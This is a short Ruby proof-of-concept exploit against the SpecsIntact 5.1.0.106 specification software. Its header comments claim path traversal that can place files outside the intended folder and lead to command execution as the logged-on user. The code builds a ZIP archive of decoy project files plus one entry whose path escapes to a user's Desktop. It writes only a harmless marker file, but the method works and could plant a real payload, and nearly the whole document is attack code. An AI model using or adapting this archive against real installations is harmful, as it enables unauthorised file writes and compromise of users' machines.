#!/usr/bin/env ruby
# https://specsintact.ksc.nasa.gov/
# SpecsIntact 5.1.0.106 can be abused to place arbitrary files outside
# of the intended location. arbitrary os commands may be executed in 
# the context of the currently logged-on user.

require 'rex'
require 'rex/zip'
zip = Rex::Zip::Archive.new
zip.add_file("mf2004.hdr")
zip.add_file("newsubfm.hdr")
zip.add_file("Properties.xml")
zip.add_file("PULL.TBL")
zip.add_file("DAFUQ_M.SIB")
zip.add_file("wmaster.hdr")
zip.add_file("\\Users\\priv\\Desktop\\mc.txt", "mc was here") 
zip.save_to("DAFUQ_M.ZIP")
